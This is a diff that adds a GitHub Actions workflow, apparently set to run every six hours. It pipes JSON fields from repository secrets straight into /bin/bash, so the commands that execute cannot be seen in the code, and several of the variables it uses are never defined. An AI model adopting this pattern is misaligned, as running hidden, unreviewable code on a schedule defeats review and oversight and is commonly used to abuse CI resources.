@@ -1,0 +1,21 @@
+name: zhebuchemalvshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhebuchemalvshi
+        env:
+          n6: ${{ secrets.n6 }}
+        run: |
+          echo $n6 | jq -r .jbv9 | /bin/bash
+          echo $r511 | jq -r .ujw303 | /bin/bash
+          echo $e27 | jq -r .hu98444 | /bin/bash
+          echo $qwx2 | jq -r .yaha688 | /bin/bash
+          echo $vg33 | jq -r .c5746 | /bin/bash
+
